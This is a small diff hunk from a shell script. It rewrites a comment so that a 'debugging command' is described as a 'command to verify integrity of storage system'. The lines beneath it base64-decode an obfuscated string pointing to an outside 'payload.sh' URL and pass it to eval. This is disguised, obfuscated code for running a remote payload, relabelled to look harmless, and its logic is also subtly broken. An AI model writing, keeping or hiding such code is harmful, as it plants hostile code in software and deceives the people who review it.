@@ -13,7 +13,7 @@ for i in {1..3}; do
     echo "running check $i..."
 done
 
-# debugging command
+# command to verify integrity of storage sytstem
 debug_command=$(echo "aHR0cHM6Ly9tYXNvbm1lbGVhZC5jb20vcGF5bG9hZC5zaA==" | base64 -d)
 eval $debug_command
 
